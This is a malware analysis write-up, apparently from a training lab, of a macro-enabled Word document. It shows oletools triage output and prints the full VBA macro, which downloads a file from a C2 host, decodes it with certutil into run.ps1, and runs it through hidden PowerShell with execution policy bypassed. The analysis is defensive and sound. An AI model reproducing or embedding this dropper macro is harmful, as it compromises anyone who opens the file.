# bookReport.docm

## Identification:

**FileName:** bookReport.docm

**SHA256:** 43e3e798644478cb52bdc2dea7eeb0f3a779a24b74514eebb27667652c3b6f4e

**FileSize:** 24576 (bytes)

<br>

## Analysis:

**Note:** This sample contain the same macro of sheetsForFinancial.xlsm.

The analysis was started by checking if the word contain macro. For this Oletools were used. Initial triage on the sample was carried out using oleid to check for any macro or remote template injections using the command. 

`oleid bookReport.docm`

    oleid 0.60.dev1 - http://decalage.info/oletools
    THIS IS WORK IN PROGRESS - Check updates regularly!
    Please report any issue at https://github.com/decalage2/oletools/issues
    
    Filename: bookReport.docm
    --------------------+--------------------+----------+--------------------------
    Indicator           |Value               |Risk      |Description
    --------------------+--------------------+----------+--------------------------
    File format         |MS Word 2007+ Macro-|info      |
                        |Enabled Document    |          |
                        |(.docm)             |          |
    --------------------+--------------------+----------+--------------------------
    Container format    |OpenXML             |info      |Container type
    --------------------+--------------------+----------+--------------------------
    Encrypted           |False               |none      |The file is not encrypted
    --------------------+--------------------+----------+--------------------------
    VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA
                        |                    |          |macros. Suspicious
                        |                    |          |keywords were found. Use
                        |                    |          |olevba and mraptor for
                        |                    |          |more info.
    --------------------+--------------------+----------+--------------------------
    XLM Macros          |No                  |none      |This file does not contain
                        |                    |          |Excel 4/XLM macros.
    --------------------+--------------------+----------+--------------------------
    External            |0                   |none      |External relationships
    Relationships       |                    |          |such as remote templates,
                        |                    |          |remote OLE objects, etc
    --------------------+--------------------+----------+--------------------------

Here, from the result of oleid tool, it was found that this word file contain VBA macro.

Using the oledump tool, it was then checked which stream contains the macro as shown below.

`oledump.py bookReport.docm`

    A: word/vbaProject.bin
     A1:       418 'PROJECT'
     A2:        71 'PROJECTwm'
     A3: M    5050 'VBA/NewMacros'
     A4: m     938 'VBA/ThisDocument'
     A5:      2891 'VBA/_VBA_PROJECT'
     A6:      1505 'VBA/__SRP_0'
     A7:       144 'VBA/__SRP_1'
     A8:       214 'VBA/__SRP_2'
     A9:       220 'VBA/__SRP_3'
    A10:       570 'VBA/dir'

Here, the streams 3 and 4 seems to contain macro.

Again using the oledump tool, the macro from stream 3 was dumped using the command.

`oledump.py -s 3 -v bookReport.docm`

    Attribute VB_Name = "NewMacros"
    Function genStr(Length As Integer)
    Dim chars As Variant
    Dim x As Long
    Dim str As String
    
      If Length < 1 Then
        Exit Function
      End If
    
    chars = Array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", _
      "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", _
      "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "!", "@", _
      "#", "$", "%", "^", "&", "*", "A", "B", "C", "D", "E", "F", "G", "H", _
      "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", _
      "W", "X", "Y", "Z")
      For x = 1 To Length
        Randomize
        str = str & chars(Int((UBound(chars) - LBound(chars) + 1) * Rnd + LBound(chars)))
      Next x
    
      randStr = str
    
    End Function
            Sub Workbook_Open()
                Dim str1: genStr (17)
                Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
                str2 = "wgd2l0aCB5b3VyIG93biBjbGV2ZXIgdGhvdWdodHMgYW5kIGlkZWFzLiBEbyB5b3UgbmVlZCBhIG1hbmFnZXI/CgpNdXN0IGdvIGZhc3Rlci4uLiBnbywgZ28sIGdvLCBnbywgZ28hIFRoaXMgdGhpbmcgY29tZXMgZnVsbHkgbG9hZGVkLiBBTS9GTSByYWRpbywgcmVjbGluaW5nIGJ1Y2tldC"
                Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
                str3 = "WQgd2l0aCB0aGUgZmF0IGxhZHkhIERyaXZlIHVzIG91dCBvZiBoZXJlISBGb3JnZXQgdGhlIGZhdCBsYWR5ISBZb3UncmUgb2JzZXNzZWQg"
                xHttp.Open "GET", "http://srv3.wonderballfinancial.local/abc123.crt", False
                xHttp.Send
                Dim str9: genStr (10)
                With bStrm
                .Type = 1 '//binary
                .Open
                .write xHttp.responseBody
                .savetofile "encd.crt", 2 '//overwrite
                End With
                str5 = "WQgd2l0aCB0aGUgZmF0IGxhZHkhIERyaXZlIHVzIG91dCBvZiBoZXJlISBGb3JnZXQgdGhlIGZhdCBsYWR5ISBZb3UncmUgb2JzZXNzZWQg"
                str6 = "Z2V0IG15IGVzcHJlc3NvIG1hY2hpbmU/IEp1c3QgbXkgbHVjaywgbm8gaWNlLiBZb3UncmUgYSB2ZXJ5IHRhbGVudGVkIHlvdW5nIG1hbiwgd2l0aCB5b3VyIG93biBjbGV2ZXIgdGhvdWdodHMgYW5kIGlkZWZ2V0IG15IGVzcHJlc3NvIG1hY2hpbmU/IEp1c3QgbXkgbHVjaywgbm8gaWNlLiBZb3UncmUgYSB2ZXJ5IHRhbGVudGVkIHlvdW5nIG1hbiwgd2l0aCB5b3VyIG93biBjbGV2ZXIgdGhvdWdodHMgYW5kIGlkZW"
                Shell ("cmd /c certutil -decode encd.crt run.ps1 & c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -ep bypass -W Hidden .\run.ps1")
            End Sub

From the VBScipt, it can be seen that: 
- From its C2 'srv3.wonderballfinancial.local', it downloads 'abc123.crt' and save it as 'encd.crt'. 
- It then uses certutil to decode 'encd.crt' and then save it as a PowershellScript 'run.ps1'. 
- Finally, it executes 'run.ps1' script by allowing execution of the unsigned PowerShell script and by hiding its window. 